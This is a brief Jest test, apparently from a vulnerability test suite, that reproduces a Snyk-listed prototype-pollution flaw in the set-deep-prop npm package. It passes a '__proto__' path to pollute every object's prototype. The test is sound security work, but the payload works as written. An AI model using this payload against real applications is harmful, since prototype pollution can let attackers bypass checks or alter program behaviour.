//https://snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231
test("prototype pollution in safe-object2", () => {
  const setDeepProp = require("set-deep-prop");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  setDeepProp({}, ["__proto__", "polluted"], "yes");
  expect({}.polluted).toBe("yes");
});
